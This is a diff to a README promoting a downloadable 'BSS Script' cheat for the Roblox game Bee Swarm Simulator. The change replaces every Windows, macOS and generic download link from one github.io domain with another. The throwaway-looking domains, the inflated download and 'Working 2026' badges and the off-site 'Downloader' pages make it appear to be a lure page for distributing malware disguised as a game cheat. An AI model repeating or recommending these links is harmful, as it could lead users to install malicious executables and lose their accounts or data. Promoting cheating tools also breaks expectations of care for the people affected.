@@ -4,7 +4,7 @@
 ![Downloads](https://img.shields.io/badge/Downloads-150K+-blueviolet?style=for-the-badge)
 ![Status](https://img.shields.io/badge/Status-Working%202026-blueviolet?style=for-the-badge)
 
-[![Download BSS Script](https://img.shields.io/badge/Download%20BSS%20Script-blueviolet?style=for-the-badge&logo=roblox&logoColor=white)](https://beauticianblaze.github.io/DownloadWin/)
+[![Download BSS Script](https://img.shields.io/badge/Download%20BSS%20Script-blueviolet?style=for-the-badge&logo=roblox&logoColor=white)](https://hydracomptrollercord.github.io/Downloader/)
 
 ---
 
@@ -49,9 +49,9 @@ The most reliable **BSS Script** for Bee Swarm Simulator — auto-farm, ESP, aim
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://beauticianblaze.github.io/DownloadWin/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://hydracomptrollercord.github.io/Downloader/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beauticianblaze.github.io/DownloadMac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://hydracomptrollercord.github.io/MacDownloader/)
 
 </div>
 
